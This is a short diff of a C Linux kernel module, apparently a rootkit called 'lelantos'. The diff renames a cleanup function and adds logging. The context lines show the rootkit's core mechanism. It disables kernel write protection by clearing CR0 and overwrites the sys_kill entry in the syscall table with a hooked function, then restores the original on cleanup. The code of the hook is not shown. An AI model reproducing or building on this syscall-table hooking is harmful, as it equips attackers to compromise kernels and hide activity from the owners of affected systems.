@@ -14,7 +14,7 @@ typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
 //core hooking functions
 static int store(void); //stores all of the origional syscalls in functions
 static void setup_hooks(void); //overwites syscall table with hooked functions
-static void cleanup(void); //overwrites syscall table with origional functions
+static void cleanup_hooks(void); //overwrites syscall table with origional functions
 static void write_cr0_forced(unsigned long val); //overwrites the cr0
 static void set_memory_protection(bool val); //turns on memory protection
 
@@ -81,15 +81,16 @@ static void set_memory_protection(bool val){
 static void setup_hooks(void){
   store(); //stores the origional functions
   set_memory_protection(false); //disables memory protection in cr0
-  printk("set sys_kill to %p", hooked_kill);
+  printk(KERN_INFO "set sys_kill to %p from %p\n", hooked_kill, orig_kill);
   __sys_call_table[__NR_kill] = (long unsigned int) &hooked_kill; //rewrites the adress of sys_kill to point to hooked_kill
   set_memory_protection(true); //enables memory protection in cr0
 }
 
 //sets the sys_call_table back to normal
-static void cleanup(void){
+static void cleanup_hooks(void){
   set_memory_protection(false); //disables memory protection in cr0
-  printk("set sys_kill to %p", orig_kill);
+  printk(KERN_INFO "set sys_kill to %p\n", orig_kill);
   __sys_call_table[__NR_kill] = (long unsigned int) &orig_kill;
   set_memory_protection(true); //enables memory protection in cr0
+  printk(KERN_INFO "lelantos cleaned up\n");
 }
